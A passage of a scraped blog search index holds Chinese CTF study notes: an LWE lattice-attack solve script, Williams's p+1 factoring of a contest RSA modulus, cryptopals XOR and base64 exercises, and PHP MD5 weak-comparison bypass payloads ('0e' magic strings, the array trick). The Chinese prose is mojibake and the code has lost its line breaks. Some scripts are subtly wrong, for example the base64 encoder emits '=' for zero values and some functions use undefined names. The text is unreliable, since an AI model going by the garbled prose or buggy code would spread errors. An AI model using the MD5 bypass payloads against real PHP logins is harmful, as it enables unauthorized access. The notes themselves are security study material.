flag)) 2021/3/31 update å› ä¸ºæœ€è¿‘åœ¨åšå¤§å­¦ç”Ÿå¯†ç æŒ‘æˆ˜èµ›çš„LWE, æ‰€ä»¥å­¦äº†æŒºå¤šé€ æ ¼å­çš„å§¿åŠ¿è¿™è¾¹è®°å½•ä¸€ä¸ªå¥½ç”¨çš„æ ¼å­, 80ç»´çš„ç§˜å¯†å‘é‡éƒ½å¯ä»¥è§„çº¦å‡ºæ¥, å¾ˆç‰›é€¼ åœ¨$As + e = b \\mod q$ä¸­ æˆ‘ä»¬å¯ä»¥æŠŠçŸ©é˜µ$A$å’Œå‘é‡$b$çœ‹æˆ$A=\\begin{pmatrix}A_1 \\\\ A_2\\end{pmatrix}$,$b=\\begin{pmatrix}b_1 \\\\ b_2\\end{pmatrix}=\\begin{pmatrix}A_1 \\\\ A_2\\end{pmatrix}s + \\begin{pmatrix}e_1 \\\\ e_2\\end{pmatrix} $ æ‰€ä»¥å’±ä»¬å°±å¯ä»¥æ„é€ å‡ºè¿™ä¹ˆä¸€ä¸ªæ ¼å­$$\\begin{pmatrix}I_n&amp;0&amp;b_1 \\\\A_2A_1^{-1}&amp;qI_{m-n}&amp;b_2 \\\\0&amp;0&amp;1\\end{pmatrix}\\begin{pmatrix}A_1s \\\\k \\\\-1\\end{pmatrix}=\\begin{pmatrix}-e_1 \\\\-e_2 \\\\-1\\end{pmatrix}$$è§„çº¦å‡ºæ¥çš„å°±ç›´æ¥æ˜¯å™ªéŸ³$e$äº†, æœ‰äº†$e$å°±èƒ½è§£å‡º$s$, ä¸è¿‡è¿™è¾¹è¿˜æ˜¯æœ‰å‡ ä¸ªç‚¹è¦å»æ³¨æ„ ä¸Šé¢å¼å­ç»™å‡ºçš„æ ¼å­å¹¶ä¸æ˜¯æ‰”è¿›sageé‡Œè§„çº¦çš„æ ¼å­, çœŸæ­£æ‰”è¿›å»è§„çº¦çš„æ˜¯å®ƒçš„è½¬ç½®, ä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯sageé»˜è®¤å¯¹è¡Œå‘é‡è§„çº¦, åªèƒ½æŠŠå®ƒè½¬ç½®æ‰èƒ½è§„çº¦å‡ºç»“æœ, ç»“æœä¹Ÿæ˜¯è¡Œå‘é‡æ¥çš„ æ ¼å­ä¸­æœ‰ä¸€ä¸ª$A_2A_1^{-1}$, å…¶ä¸­çš„é€†çŸ©é˜µ$A_1^{-1}$æ˜¯æ¨¡$q$çš„é€†, æœ‰æ—¶å€™ä¼šå‡ºç°æ¨¡$q$ä¸èƒ½æ±‚é€†çš„æƒ…å†µ, è¿™ä¸ªæ—¶å€™å¯ä»¥é€‚å½“çš„è°ƒæ¢$A$ä¸­çš„è¡Œå‘é‡, ä½¿å¾—$A_1 \\mod q$çš„é€†å­˜åœ¨, ä½†è¦è®°å¾—å‘é‡$b$ä¹Ÿè¦è·Ÿç€è°ƒæ¢, è€Œä¸”æœ€åæ±‚åˆ°çš„ç»“æœä¹Ÿæ˜¯è°ƒæ¢ä¹‹åçš„, éœ€è¦è¿˜åŸå›å» æš‚æ—¶å°±è¿™ä¸¤ä¸ªç‚¹äº† ä¸ºäº†å†™ä¸ªæ¿å­ä¾›ä»¥ååšé¢˜ç”¨, æˆ‘æŠŠç¥¥äº‘æ¯é‚£é“é¢˜çš„æ•°æ®æ‹¿è¿‡æ¥å†™äº†ä¸ªexp, è´´åœ¨è¿™è¾¹ä»¥åè¦ç”¨äº†å¯ä»¥è¿‡æ¥æ‹¿. 1234567891011121314151617181920212223242526272829303132333435363738import numpy as nprow = 128col = 42p = 2129M = Matrix(list(np.load('matrix.npy')))R = vector(list(np.load('result.npy')))A1 = M[:col]A2 = M[col:]A12 = A2 * A1.inverse() % pL = Matrix([[0 for _ in range(row+1)] for _ in range(row+1)])for i in range(col): for j in range(col): if i == j: L[i,j] = 1 for i in range(row - col): for j in range(row - col): if i == j: L[i+col,j+col] = pfor i in range(row-col): for j in range(col): L[i+col,j] = A12[i,j]for i in range(row): L[i,-1] = R[i]L[-1,-1] = 1reduced = L.transpose().LLL()error = []for i in reduced[0][:-1]: error.append(-i)e = vector(error)As = R - eA = Matrix(Zmod(p),M)for i in A.solve_right(As): print(chr(i),end='')","link":"/2021/03/31/The-learning-of-LWE/"},{"title":"Williams's p+1 algorithm","text":"åœ¨è®¡ç®—æ•°è®ºä¸­ï¼ŒWilliamsçš„p+1ç®—æ³•æ˜¯ä¸€ç§æ•´æ•°åˆ†è§£ç®—æ³•ï¼Œæ˜¯ä»£æ•°ç¾¤å› å­åˆ†è§£ç®—æ³•å®¶æ—ä¸­çš„ä¸€ç§ã€‚å®ƒæ˜¯Hugh C. Williamsåœ¨1982å¹´å‘æ˜çš„ã€‚å¦‚æœè¦åˆ†è§£çš„æ•°NåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªç´ æ•°å› å­pï¼Œä¸”p+1æ˜¯å…‰æ»‘çš„(å³p+1åªåŒ…å«å°çš„å› å­)ï¼Œé‚£ä¹ˆWilliamsâ€™s p+1æœ‰æ•ˆã€‚Williamsâ€™s p+1ä½¿ç”¨Lucasåºåˆ—åœ¨äºŒæ¬¡åŸŸä¸­æ‰§è¡Œæ±‚å¹‚è¿ç®—ã€‚ å®ƒç±»ä¼¼äºPollardçš„pâˆ’1ç®—æ³•ã€‚ ç®—æ³•åŸç†é€‰æ‹©ä¸€ä¸ªå¤§äº2çš„æ•´æ•°Aæ¥è®¡ç®—Lucasåºåˆ—:$$ V_0 = 2,V_1 = A $$$$ V_j = AV_{j-1}-V_{j-2} $$å…¶ä¸­æ‰€æœ‰çš„è¿ç®—éƒ½æ˜¯æ¨¡Nçš„ å½“Mæ˜¯$p-(D/p)$çš„å€æ•°æ—¶ï¼Œå¥‡ç´ æ•°pæ•´é™¤$gcd(N,V_M-2)$ï¼Œ $D=A^2-4$$(D/P)$æ˜¯jacobi symbol æˆ‘ä»¬è¦æ±‚$(D/p)=-1$ï¼Œå³Dåº”è¯¥æ˜¯ä¸€ä¸ªæ¨¡pçš„äºŒæ¬¡çš„éå‰©ä½™ï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬ä¸çŸ¥é“pï¼Œæ‰€ä»¥åœ¨æ‰¾åˆ°è§£ä¹‹å‰å¯èƒ½éœ€è¦ä¸€ä¸ªä»¥ä¸Šçš„Aå€¼ã€‚($D=A^2-4$) å¦‚æœ$(D/p)=+1$ï¼Œåˆ™è¯¥ç®—æ³•é€€åŒ–ä¸ºPollardçš„pâˆ’1ç®—æ³•çš„æ…¢ç‰ˆæœ¬ã€‚ å› æ­¤ï¼Œå¯¹äºä¸åŒçš„Må€¼ï¼Œæˆ‘ä»¬è®¡ç®— $gcd(N,V_{M-2})$ ï¼Œå½“ç»“æœä¸ç­‰äº1æˆ–Næ—¶ï¼Œæˆ‘ä»¬ä¾¿æ‰¾åˆ°äº†Nçš„ä¸€ä¸ªéå¹³å‡¡å› å­ã€‚ ä½¿ç”¨çš„Må€¼æ˜¯è¿ç»­çš„é˜¶ä¹˜ï¼Œè€Œ $V_M$ æ˜¯ä»¥ $V_{M-1}$ ä¸ºç‰¹å¾çš„åºåˆ—çš„ç¬¬Mä¸ªå€¼ ä¸ºäº†æ‰¾åˆ°ä»¥Bä¸ºç‰¹å¾çš„åºåˆ—çš„ç¬¬Mä¸ªå…ƒç´ Vï¼Œæˆ‘ä»¬ä»¥ç±»ä¼¼äºä»å·¦åˆ°å³æ±‚å¹‚çš„æ–¹å¼è¿›è¡Œè®¡ç®—: 12345678910x := By := ( B ^ 2 - 2 ) MOD Nfor each bit of M to the right of the most significant bit do if the bit is 1 then x := ( x * y - B ) MOD N y := ( y ^ 2 - 2 ) MOD N else y := ( x ^ y - B ) MOD N x := ( x ^ 2 - 2 ) MOD NV := x ä¾‹å­ä»¤n = 112729ï¼ŒA = 5ï¼Œæ±‚å¾—çš„$V_M$çš„è¿ç»­å€¼ä¸º: 1234567V1 of seq(5) = V1! of seq(5) = 5V2 of seq(V1) = V2! of seq(5) = 23V3 of seq(V2) = V3! of seq(5) = 12098V4 of seq(V3) = V4! of seq(5) = 87680V5 of seq(V4) = V5! of seq(5) = 53242V6 of seq(V5) = V6! of seq(5) = 27666V7 of seq(V6) = V7! of seq(5) = 110229 æ­¤æ—¶ï¼Œ$gcd(110229-2,112729) = 139$ï¼Œæ‰€ä»¥139 æ˜¯112729çš„ä¸€ä¸ªéå¹³å‡¡ç´ å› å­ã€‚æ³¨æ„åˆ° $p+1 = 140 = 2^2 * 5 * 7$ã€‚è€Œ $7!$ æ˜¯æœ€å°çš„æ˜¯140çš„å€æ•°çš„é˜¶ä¹˜æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªåˆé€‚çš„å› å­139ã€‚ ä¾‹é¢˜ [V&amp;N2020 å…¬å¼€èµ›]easy_RSAå°±æ˜¯å› ä¸ºè¿™é¢˜ï¼Œæ‰ä¼šæƒ³åˆ°Williamsâ€™s p+1å®¡è®¡ä»£ç å‘ç°n = qpr ä¸­ä¸‰ä¸ªå› å­éƒ½æ˜¯p+1å…‰æ»‘çš„æ‰€ä»¥æƒ³åˆ°Williamsâ€™s p+1 12345678910111213141516171819202122232425n=7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409A = [5, 7, 9, 11, 13]def seq(t, base, n): x = 2 y = base i = 0 while True: x, y = y, (base * y - x) % n i += 1 if i == t: return x breakfac = []for v in A: for i in range(1, 5000): v = seq(i, v, n) p = gmpy2.gcd(v - 2, n) print(i,p) if p != 1: fac.append(p) break if len(fac) != 0: break å½“ç¨‹åºåœ¨A = 5 , i = 2391æ—¶å°±è·‘å‡ºäº†å…¶ä¸­ä¸€ä¸ªå› å­ä¸º 1102634610559478918970860957918259981057327949366949344137104804864768237961662136189827166317524151288799657758536256924609797810164397005081733039415393 ç„¶åç”¨né™¤ä»¥è¿™ä¸ªå› å­å¹¶å¯¹å¾—æ•°ç»§ç»­Williamsâ€™s p+1ä¾¿å¯ä»¥åˆ†è§£å‡ºå‰©ä¸‹çš„ä¸¤ä¸ªå› å­ wikiæ²¡æœ‰ä¸­æ–‡å¯çœŸæ˜¯å¤´å¤§(åŸç†å’Œä¾‹å­å…¶å®å°±æ˜¯è‹±æ–‡wikiä¸ŠWilliamsâ€™s p+1çš„æ‘˜æŠ„+ç¿»è¯‘å•¦","link":"/2020/09/26/Williams-s-p-1-algorithm/"},{"title":"cryptopals","text":"å¼€å§‹å­¦ä¹ cryptopalså•¦, ä¸€é¢˜ä¸€é¢˜çš„åšå®Œå®ƒå§(ä¹Ÿä¸çŸ¥é“èƒ½åšå¤šä¹…â€¦ ç›®å½• cryptopals 1.1 - Convert hex to base64 cryptopals 1.2 - Fixed XOR cryptopals 1.3 - Single-byte XOR cipher cryptopals 1.4 - Detect single-character XOR cryptopals 1.5 - Implement repeating-key XOR cryptopals 1.6 - Break repeating-key XOR cryptopals 1.7 - AES in ECB mode cryptopals 1.8 - Detect AES in ECB mode cryptopals 1.1 - Convert hex to base64challenge The string: 149276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d Should produce: 1SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t So go ahead and make that happen. Youâ€™ll need to use this code for the rest of the exercises. å¤§æ¦‚å°±æ˜¯æ‰‹åŠ¨å†™ä¸€ä¸ªhex2base64çš„è„šæœ¬å§ Base64å†™ä¹‹å‰å…ˆå»äº†è§£ä¸€ä¸‹hexè½¬base64çš„åŸç†(wikiçœŸä¸é”™Base64æ˜¯ä¸€ç§åŸºäº64ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®çš„è¡¨ç¤ºæ–¹æ³•ã€‚ç”±äº $log _2 64=6$ï¼Œæ‰€ä»¥æ¯6ä¸ªæ¯”ç‰¹ä¸ºä¸€ä¸ªå•å…ƒï¼Œå¯¹åº”æŸä¸ªå¯æ‰“å°å­—ç¬¦ã€‚3ä¸ªå­—èŠ‚ç›¸å½“äº24ä¸ªæ¯”ç‰¹ï¼Œå¯¹åº”äº4ä¸ªBase64å•å…ƒï¼Œå³3ä¸ªå­—èŠ‚å¯ç”±4ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºã€‚ è½¬æ¢çš„æ—¶å€™ï¼Œå°†3å­—èŠ‚çš„æ•°æ®ï¼Œå…ˆåæ”¾å…¥ä¸€ä¸ª24ä½çš„ç¼“å†²åŒºä¸­ï¼Œå…ˆæ¥çš„å­—èŠ‚å é«˜ä½ã€‚æ•°æ®ä¸è¶³3å­—èŠ‚çš„è¯ï¼Œäºç¼“å†²å™¨ä¸­å‰©ä¸‹çš„æ¯”ç‰¹ç”¨0è¡¥è¶³ã€‚æ¯æ¬¡å–å‡º6æ¯”ç‰¹ï¼ŒæŒ‰ç…§å…¶å€¼é€‰æ‹© 12ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ ä¸­çš„å­—ç¬¦ä½œä¸ºç¼–ç åçš„è¾“å‡ºï¼Œç›´åˆ°å…¨éƒ¨è¾“å…¥æ•°æ®è½¬æ¢å®Œæˆã€‚ è‹¥åŸæ•°æ®é•¿åº¦ä¸æ˜¯3çš„å€æ•°æ—¶ä¸”å‰©ä¸‹1ä¸ªè¾“å…¥æ•°æ®ï¼Œåˆ™åœ¨ç¼–ç ç»“æœååŠ 2ä¸ª=ï¼›è‹¥å‰©ä¸‹2ä¸ªè¾“å…¥æ•°æ®ï¼Œåˆ™åœ¨ç¼–ç ç»“æœååŠ 1ä¸ª=ã€‚ è„šæœ¬çŸ¥é“åŸç†å°±å¥½å†™è„šæœ¬äº† 12345678910111213141516171819202122232425262728293031323334353637def padding(Hex): if len(Hex) % 6: return Hex + '0' * (6 - len(Hex) % 6) return Hexdef encodeb64(Hex): Hex = padding(Hex) output = '' for i in range(0, len(Hex), 6): buff = bin(int(Hex[i:i + 6], 16))[2:] buff = '0' * (24 - len(buff)) + buff for j in range(0, len(buff), 6): value = int(buff[j:j + 6], 2) if value == 0: output += '=' elif value &lt; 26: output += chr(value + 65) elif value &lt; 52: output += chr(value + 71) elif value &lt; 62: output += str(value - 52) elif value == 62: output += '+' else: output += '/' return outputdef main(): Hex = '49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d' print(encodeb64(Hex))if __name__ == '__main__': main() cryptopals 1.2 - Fixed XORé¢˜ç›® Write a function that takes two equal-length buffers and produces their XOR combination. If your function works properly, then when you feed it the string: 11c0111001f010100061a024b53535009181c â€¦ after hex decoding, and when XORâ€™d against: 1686974207468652062756c6c277320657965 â€¦ should produce: 1746865206b696420646f6e277420706c6179 ç›¸åŒé•¿åº¦çš„åå…­è¿›åˆ¶çš„xor, ä¸€ä½ä¸€ä½çš„xorå°±è¡Œäº†å§ è„šæœ¬1234567891011121314def fixex_xor(Hex1, Hex2): res = '' for i, j in zip(Hex1, Hex2): res += hex(int(i, 16) ^ int(j, 16))[2:] return resdef main(): Hex1 = '1c0111001f010100061a024b53535009181c' Hex2 = '686974207468652062756c6c277320657965' print(fixex_xor(Hex1, Hex2))if __name__ == '__main__': main() è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„,åé¢å°±ä¸ä¸€å®šäº†Orz cryptopals 1.3 - Single-byte XOR cipher ä»è¿™é‡Œå¼€å§‹éš¾åº¦çªç„¶å°±ä¸Šå‡äº† é¢˜ç›® The hex encoded string: 11b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736 â€¦ has been XORâ€™d against a single character. Find the key, decrypt the message. You can do this by hand. But donâ€™t: write code to do it for you. How? Devise some method for â€œscoringâ€ a piece of English plaintext. Character frequency is a good metric. Evaluate each output and choose the one with the best score. è¯´æ˜¯ä¸€æ®µæ–‡å­—è¢«å•ä¸ªå­—ç¬¦(8bit)å¼‚æˆ–åŠ å¯†äº†, è¦æ‰¾å‡ºè¿™ä¸ªå­—ç¬¦ç„¶åè¾“å‡ºæ˜æ–‡, å¯†é’¥ç©ºé—´ä¸º$2^8$, ä¹Ÿä¸ç®—å¤š, ä½†æ˜¯å¦‚ä½•è®©ç¨‹åºæ‰¾å‡ºå”¯ä¸€ä¸€ä¸ªæ­£ç¡®çš„å­—ç¬¦? æç¤ºä¸Šæœ‰æåˆ°å¯ä»¥åˆ©ç”¨è§£å¯†åçš„å­—ç¬¦ä¸²çš„â€å¾—åˆ†â€. æŸ¥äº†ä¸€ä¸‹, åœ¨ä¸€ä¸ªdalaoçš„åšå®¢ä¸Šæ‰¾åˆ°çš„è¿™ä¸ªå¾—åˆ†åº”è¯¥å«å­—ç¬¦é¢‘ç‡(dalaoè¯´wikiä¸Šæœ‰å­—ç¬¦é¢‘ç‡è¡¨, ä½†æˆ‘æ²¡æ‰¾åˆ°, å°±è¿è¿™ä¸ªâ€å¾—åˆ†â€çš„ç›¸å…³å†…å®¹éƒ½æ²¡æ‰¾åˆ°), ä½†æ˜¯è¿˜å¥½ä»–çš„åšå®¢é‡Œé™„å¸¦äº†ä¸€ä¸ªå­—ç¬¦é¢‘ç‡çš„æ•°ç»„. 12345CHARACTER_FREQ = { #å­—ç¬¦é¢‘ç‡è¡¨, å‡ºç°ä¸€æ¬¡æŸå­—æ¯çš„å¾—åˆ† 'a': 0.0651738, 'b': 0.0124248, 'c': 0.0217339, 'd': 0.0349835, 'e': 0.1041442, 'f': 0.0197881, 'g': 0.0158610, 'h': 0.0492888, 'i': 0.0558094, 'j': 0.0009033, 'k': 0.0050529, 'l': 0.0331490, 'm': 0.0202124, 'n': 0.0564513, 'o': 0.0596302, 'p': 0.0137645, 'q': 0.0008606, 'r': 0.0497563, 's': 0.0515760, 't': 0.0729357, 'u': 0.0225134, 'v': 0.0082903, 'w': 0.0171272, 'x': 0.0013692, 'y': 0.0145984, 'z': 0.0007836, ' ': 0.1918182} é€šè¿‡è¿™ä¸ªå­—ç¬¦é¢‘ç‡è¡¨, å¯ä»¥å®šé‡çš„åˆ†ææ¯æ¬¡è§£å¯†ç»“æœçš„å¾—åˆ†, å¾—åˆ†æœ€é«˜å°±ä»£è¡¨æœ€æ¥è¿‘æ­£å¸¸è‹±æ–‡è¯­å¥(æˆ–è€…è¯´æ–‡ç« ). è„šæœ¬1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950CHARACTER_FREQ = { # å­—ç¬¦é¢‘ç‡è¡¨, å‡ºç°ä¸€æ¬¡æŸå­—æ¯çš„å¾—åˆ† 'a': 0.0651738, 'b': 0.0124248, 'c': 0.0217339, 'd': 0.0349835, 'e': 0.1041442, 'f': 0.0197881, 'g': 0.0158610, 'h': 0.0492888, 'i': 0.0558094, 'j': 0.0009033, 'k': 0.0050529, 'l': 0.0331490, 'm': 0.0202124, 'n': 0.0564513, 'o': 0.0596302, 'p': 0.0137645, 'q': 0.0008606, 'r': 0.0497563, 's': 0.0515760, 't': 0.0729357, 'u': 0.0225134, 'v': 0.0082903, 'w': 0.0171272, 'x': 0.0013692, 'y': 0.0145984, 'z': 0.0007836, ' ': 0.1918182}from Set1.Fixed_XOR import fixed_xordef hex2text(Hex): h = Hex if len(h) % 2 == 1: t = '0' + h return ''.join([chr(int(b, 16)) for b in [h[i:i + 2] for i in range(0, len(h), 2)]])def keygen(LEN): for i in range(256): yield ((2 - len(hex(i)[2:])) * '0' + hex(i)[2:]) * (LEN // 2)def getscore(text): score = 0 for i in text: i = i.lower() if i in CHARACTER_FREQ: score += CHARACTER_FREQ[i] return scoredef attack(cipher): generator = keygen(len(cipher)) res = [] for i in generator: plain = hex2text(fixed_xor(cipher, i)) score = getscore(plain) res.append([plain, score, i]) return resdef main(): cipher = '1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736' max = [0, -1] for i in attack(cipher): if max[1] &lt; i[1]: max = i print(max)if __name__ == '__main__': main() å…³äºæœ€åé¢çš„æ’åº, çœ‹äº†ç›¸å…³æ–‡ç« å‘ç°å…¶å®å¯ä»¥ç”¨sorted()å‡½æ•° ç›´æ¥ä¸¾ä¾‹å­, ç®€å•æ˜“æ‡‚ å¯¹é”®æ’åº123dict1={'a':2,'e':3,'f':8,'d':4}list1= sorted(dict1.items(),key=lambda x:x[0])print(list1) å¯¹å€¼æ’åº123dict1={'a':2,'e':3,'f':8,'d':4}list1= sorted(dict1.items(),key=lambda x:x[1])print(list1) å€Ÿç”¨å¤§ä½¬çš„ä»£ç , å…¶å®attackå‡½æ•°å¯ä»¥å†™æˆ12345678def attack(cipher): generator = keygen(len(cipher)) res = [] for i in generator: plain = hex2text(fixed_xor(cipher, i)) score = getscore(plain) res.append({'key': key, 'plaintext': plaintext, 'score': score}) return sorted(res, key = lambda c:c['score']) cryptopals 1.4 - Detect single-character XORé¢˜ç›® One of the 60-character strings in this file has been encrypted by single-character XOR. Find it. (Your code from #3 should help.) æ„æ€æ˜¯è¯´, åœ¨é‚£ä¸ªæ–‡ä»¶é‡Œé¢çš„60ä¸ªå­—ç¬¦ä¸²é‡Œé¢, æœ‰ä¸€ä¸ªæ˜¯è¢«xoråŠ å¯†è¿‡åçš„(ä¸€å¼€å§‹è¯»é¢˜è¿˜ä»¥ä¸ºæ˜¯60ä¸ªéƒ½æ˜¯è¢«åŠ å¯†çš„), è®©æˆ‘ä»¬æ‰¾åˆ°ä»–å¹¶ä¸”è§£å¯†å‡ºæ¥. å…¶å®è·Ÿ1.3æ²¡ä»€ä¹ˆåŒºåˆ«, åªæ˜¯ä»1ç»„é‡Œé¢é€‰å¾—åˆ†æœ€é«˜çš„å¯†é’¥å˜æˆå…ˆæ ¹æ®å¯†é’¥é€‰å‡º1ç»„é‡Œé¢æœ€é«˜åˆ†çš„, å†é€‰å‡º60ä¸ªå­—ç¬¦ä¸²é‡Œé¢æœ€é«˜åˆ†çš„é‚£ç»„. è„šæœ¬123456789101112131415161718from Single_byte_XOR_cipher import *def main(): cipher = '' res = [] with open('4.txt', 'r') as f: while True: cipher = f.readline()[:-1] if cipher == '': break res.append(attack(cipher)[-1]) print(sorted(res, key=lambda x: x['score'])[-1])if __name__ == '__main__': main() cryptopals 1.5 - Implement repeating-key XORé¢˜ç›® Here is the opening stanza of an important work of the English language: 12Burning 'em, if you ain't quick and nimbleI go crazy when I hear a cymbal Encrypt it, under the key â€œICEâ€, using repeating-key XOR. In repeating-key XOR, youâ€™ll sequentially apply each byte of the key; the first byte of plaintext will be XORâ€™d against I, the next C, the next E, then I again for the 4th byte, and so on. It should come out to: 120b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272a282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f Encrypt a bunch of stuff using your repeating-key XOR function. Encrypt your mail. Encrypt your password file. Your .sig file. Get a feel for it. I promise, we arenâ€™t wasting your time with this. é¢˜ç›®å‡çº§äº†!!! è„šæœ¬å†™å®Œè„šæœ¬æ‰å‘ç°ä»–æ˜¯è¦æˆ‘åŠ å¯†, è€Œä¸æ˜¯è§£å¯†, æ‰€ä»¥åªå¥½å†å†™ä¸€ä¸ªåŠ å¯†çš„äº† è§£å¯†123456789101112131415161718192021222324from Fixed_XOR import fixed_xorfrom Single_byte_XOR_cipher import hex2textdef keypadding(ciplen, key): return ''.join([key[i % len(key)] for i in range(ciplen)])def text2hex(text): return ''.join(hex(ord(i))[2:] for i in text)def main(): cipher = '0b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272\\na282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f' key = 'ICE' cipher = ''.join(cipher.split('\\n')) padkey = text2hex(keypadding(len(cipher), key)) res = hex2text(fixed_xor(cipher, padkey)) print(res)if __name__ == '__main__': main() åŠ å¯†1234567891011121314151617181920212223from Fixed_XOR import fixed_xordef keypadding(ciplen, key): return ''.join([key[i % len(key)] for i in range(ciplen)])def text2hex(text): return ''.join(hex(ord(i))[2:] for i in text)def main(): plain = &quot;Burning 'em, if you ain't quick and nimble I go crazy when I hear a cymbal&quot; key = 'ICE' padkey = keypadding(len(plain), key) hexplain = text2hex(plain) hexpadkey = text2hex(padkey) print(fixed_xor(hexplain, hexpadkey))if __name__ == '__main__': main() cryptopals 1.6 - Break repeating-key XORé¢˜ç›® Thereâ€™s a file here. Itâ€™s been base64â€™d after being encrypted with repeating-key XOR. Decrypt it. Hereâ€™s how: Let KEYSIZE be the guessed length of the key; try values from 2 to (say) 40. Write a function to compute the edit distance/Hamming distance between two strings. The Hamming distance is just the number of differing bits. The distance between:this is a test and wokka wokka!!! is 37. Make sure your code agrees before you proceed. For each KEYSIZE, take the first KEYSIZE worth of bytes, and the second KEYSIZE worth of bytes, and find the edit distance between them. Normalize this result by dividing by KEYSIZE. The KEYSIZE with the smallest normalized edit distance is probably the key. You could proceed perhaps with the smallest 2-3 KEYSIZE values. Or take 4 KEYSIZE blocks instead of 2 and average the distances. Now that you probably know the KEYSIZE: break the ciphertext into blocks of KEYSIZE length. Now transpose the blocks: make a block that is the first byte of every block, and a block that is the second byte of every block, and so on. Solve each block as if it was single-character XOR. You already have code to do this. For each block, the single-byte XOR key that produces the best looking histogram is the repeating-key XOR key byte for that block. Put them together and you have the key. This code is going to turn out to be surprisingly useful later on. Breaking repeating-key XOR (â€œVigenereâ€) statistically is obviously an academic exercise, a â€œCrypto 101â€ thing. But more people â€œknow howâ€ to break it than can actually break it, and a similar technique breaks something much more important. cryptopals 1.7 - AES in ECB modeé¢˜ç›® The Base64-encoded content in this file has been encrypted via AES-128 in ECB mode under the key &quot;YELLOW SUBMARINE&quot;. (case-sensitive, without the quotes; exactly 16 characters; I like â€œYELLOW SUBMARINEâ€ because itâ€™s exactly 16 bytes long, and now you do too). Decrypt it. You know the key, after all. Easiest way: use OpenSSL::Cipher and give it AES-128-ECB as the cipher. You can obviously decrypt this using the OpenSSL command-line tool, but weâ€™re having you get ECB working in code for a reason. Youâ€™ll need it a lot later on, and not just for attacking ECB. æœªå®Œå¾…ç»­â€¦ cryptopals 1.8 - Detect AES in ECB modeé¢˜ç›®In this file are a bunch of hex-encoded ciphertexts. One of them has been encrypted with ECB. Detect it. Remember that the problem with ECB is that it is stateless and deterministic; the same 16 byte plaintext block will always produce the same 16 byte ciphertext. æœªå®Œå¾…ç»­â€¦","link":"/2020/10/10/cryptopals/"},{"title":"PHP Weak type about MD5","text":"ä¸»è¦å°±æ˜¯å¯¹ä¸€äº›åœ¨PHPä¸­MD5å€¼åˆ¤æ–­çš„æ¼æ´çš„ç§¯ç´¯å§(æ¯æ¬¡éƒ½è¦æŸ¥payloadå¾ˆéº»çƒ¦çš„ ä¸ºäº†æ–¹ä¾¿, æ–‡ç« ä¸­çš„æ‰€æœ‰å˜é‡éƒ½ä¸å¸¦$ 1. a != b and md5(a) == md5(b)ç”¨==æ¥åˆ¤æ–­ä¸¤ä¸ªå˜é‡(è¿™æ ·å†™è‚¯å®šä¼šè¢«å­¦é•¿éª‚çš„!!!, æ€ä¹ˆç»•è¿‡å‘¢?å…ˆç»™å‡ºä¸¤ä¸ªå­—ç¬¦ä¸²å§QNKCDZO å’Œ 240610708 è€Œè¿™ä¸¤ä¸ªå­—ç¬¦ä¸²çš„MD5å€¼ä¸º 120e8304004519934940580242199033910e462097431906509019562988736854 PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶, å®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€œ0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0, å…·ä½“çš„åŸå› å‘¢æ˜¯å› ä¸º0eå¼€å¤´ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•, eåé¢çš„æ•°ä¼šè¢«è®¤ä¸ºæ˜¯æ¬¡å¹‚, è€Œä¸ç®¡0ä¹˜10çš„å‡ æ¬¡å¹‚éƒ½æ˜¯0. æ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥å, å…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€œ0Eâ€å¼€å¤´çš„, é‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒ, éƒ½æ˜¯0. 2. a !== b and md5(a) === md5(b)è¦é€šè¿‡è¿™ä¸ªåˆ¤æ–­, è¦åˆ©ç”¨MD5ä¸èƒ½å¤„ç†æ•°ç»„è¿™ä¸ªæ¼æ´, å°±æ˜¯è¯´å½“aå’Œbéƒ½æ˜¯æ•°ç»„çš„æ—¶å€™, md5(a) === md5(b) ä¼šåˆ¤æ–­ä¸ºçœŸ. è‡³äºæ€ä¹ˆè®©a !== b, a[]=1;b[]=2å°±è¡Œäº†. 3. (string)a !== (string)b and md5(a) === md5(b)å•Šè¿™â€¦è¿™ä¸ªå¯ä»¥ç›´æ¥å»æ‰¾ä¸¤ä¸ªç›¸ç­‰md5çš„å­—ç¬¦ä¸². 